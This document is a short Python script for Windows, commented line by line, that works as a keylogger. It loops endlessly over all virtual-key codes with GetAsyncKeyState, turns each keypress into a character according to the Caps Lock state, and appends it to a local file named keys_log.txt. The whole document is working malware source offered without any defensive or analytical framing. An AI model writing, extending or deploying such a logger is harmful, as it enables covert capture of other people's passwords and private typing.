import ctypes  # Import ctypes to interact with Windows DLLs for low-level system calls

# Load the user32.dll, which provides access to user input functions
user32 = ctypes.windll.user32

# Open a log file in append mode to write keystrokes
log_file = open("keys_log.txt", "a")

while True:
    # Loop through all virtual-key codes (0 to 254)
    for i in range(0, 255):
        # Check if the key with code 'i' was pressed since last call
        if user32.GetAsyncKeyState(i) & 0x0001:
            
            # Check if Caps Lock is active (key state for Caps Lock is toggled)
            caps_on = user32.GetKeyState(0x14) & 0x0001

            # Skip processing the Caps Lock key itself
            if i != 0x14:
                # If the key code corresponds to an uppercase letter (A-Z)
                if i >= 0x41 and i <= 0x5A:
                    if caps_on:
                        key = chr(i)  # Uppercase letter
                    else:
                        key = chr(i+32)  # Convert to lowercase
                else:
                    # For other keys, simply get the character representation
                    key = chr(i)
                
                # Print to the console
                print(key, end="", flush=True)
                # Write to the log file and flush the buffer to update the file immediately
                log_file.write(key)
                log_file.flush()

